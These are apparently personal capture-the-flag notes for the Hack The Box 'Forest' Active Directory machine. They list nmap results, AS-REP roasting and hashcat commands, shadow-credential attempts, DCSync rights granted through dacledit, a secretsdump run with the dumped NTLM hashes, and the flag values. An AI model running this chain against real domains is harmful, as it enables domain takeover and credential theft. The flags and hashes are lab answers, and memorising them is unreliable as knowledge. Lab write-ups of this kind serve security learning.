# 10.129.95.210
- FOREST htb.local
- Creds:
sebastien
lucinda
svc-alfresco
andy
mark
santi


## NMAP
```
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION                                                                     
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-10 15:14:36Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn          
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?                         
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped                        
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped                        
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0       
|_http-title: Not Found                           
9389/tcp  open  mc-nmf       .NET Message Framing 
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC                                                       
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49697/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```


## Foothold
- `nxc smb 10.129.95.210 -u '' -p '' --users` shows users - save to users.txt
- `nxc smb 10.129.95.210 -u usres.txt -p '' -k` shows users vulnerable to asrep roasting
    - `svc_alfresco`
- `impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users.txt`
- `hashcat -m 18200 svc-alfresco.hash /opt/SecLists/mine/rockyou.txt`
- evil-winrm into svc-alfresco to get user.txt - dbc7a3e0f79d45709221444ea39047de

## PrivEsc
- `net user svc-alfresco` shows we have `Service Account` privileges
- running bloodhound as `svc-alfresco`
    - there is another computer `EXCH01`

### OPTIONS 
#### (WRONGGGG)
- `GenericAll` over `Enterprise Key Admins`
- `Enterprise Key Admins` has `AddKeyCredentials` over FOREST$

**EXPLOIT**
1. `bloodyAD --host FOREST -d htb.local -u svc-alfresco -p s3rvice add groupMember 'Enterprise Key Admins' 'svc-alfresco'`

2. `bloodyAD --host FOREST -d htb.local -u svc-alfresco -p s3rvice add shadowCredentials FOREST$`
    - creates cert and key pem files
- `python3 ~/tools/AD-tools/PKINITtools/gettgtpkinit.py -cert-pem VwvKWkZM_cert.pem -key-pem VwvKWkZM_priv.pem htb.local/'FOREST$' VwvKWkZM.ccache`

2. `python3 pywhisker.py -d 'htb.local' -u svc-alfresco -p s3rvice --target 'forest$' --action 'add'`
```   
[*] Searching for the target account
[*] Target user found: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 9d5b7425-bfc9-3134-4cde-496c2c9dbdd4
[*] Updating the msDS-KeyCredentialLink attribute of forest$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: NSJtDSu1.pfx
[+] PFX exportiert nach: NSJtDSu1.pfx
[i] Passwort für PFX: dpiTDdN4e0X1Gh9ObuIs
[+] Saved PFX (#PKCS12) certificate & key at path: NSJtDSu1.pfx
[*] Must be used with password: dpiTDdN4e0X1Gh9ObuIs
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

#### 2. Exchange Windows Permissions has WriteDACL over HTB.local

**EXPLOIT**
1. add to group 
- `bloodyAD --host FOREST -d htb.local -u svc-alfresco -p s3rvice add groupMember 'Exchange Windows Permissions' 'svc-alfresco'`

2. add dcsync (extended permissions) on svc-alfresco
- `/opt/impacket/examples/dacledit.py -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'`

3. `impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@10.129.95.210`

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:ab6d7decfcc1ffced5b9e416815cb25b:::  
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::
```
- evil-winrm into forest as administrator to get root.txt - 1d4958cedceff5904c3bd5c7c4fc62a9
